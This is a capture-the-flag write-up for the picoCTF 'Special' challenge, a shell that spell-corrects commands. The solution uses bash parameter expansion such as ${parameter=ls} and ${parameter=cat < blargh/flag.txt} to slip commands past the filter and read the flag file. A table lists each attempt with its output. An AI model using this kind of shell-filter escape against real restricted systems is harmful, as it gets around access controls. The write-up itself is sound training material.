## Special
AUTHOR: LT 'SYREAL' JONES

Description
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.
ssh -p 51065 ctf-player@saturn.picoctf.net
The password is d8819d45

## Solution
This was a real rollercosta I have to say. 
The hint guided me on this challenge
`hint`:`Experiment with different shell syntax`
1. ssh to the server `ssh -p 51065 ctf-player@saturn.picoctf.net`

2. After logging in, I realized we can't run normal commands as they are jumbled somehow.

3. I immedietely run to google and I had a chance to learn a lot about shell syntax, my friend [@noamgariani11](https://github.com/noamgariani11) really did come up to my rescue on this one.
4. I followed a syntax [noamgariani11](https://github.com/noamgariani11) had suggested `${parameter?ls}	` `${parameter={command}}`
 
The syntax `${parameter='command_here'}` is used for parameter expansion in shell scripting. It assigns a default value to the variable parameter if it is not already set.
Learning about this new syntax , I jumped back to the challenge.
5. I started with listing available folders or files and sequentially followed the following table

| Command                   | Output                              |
|---------------------------|-------------------------------------|
| ${parameter?ls}           | parameter: ls                       |
| ${:ls}                    | Bad substitution                    |
| ${parameter=ls}           | blargh                              |
| ${parameter=cat blargh}   | cat: blargh: Is a directory         |
| ${parameter=cd blargh}    | ${parameter=cd blargh}              |
| ${parameter=ls blargh}    | flag.txt                            |
| ${parameter=cat < blargh/flag.txt} | This gave the flag           |
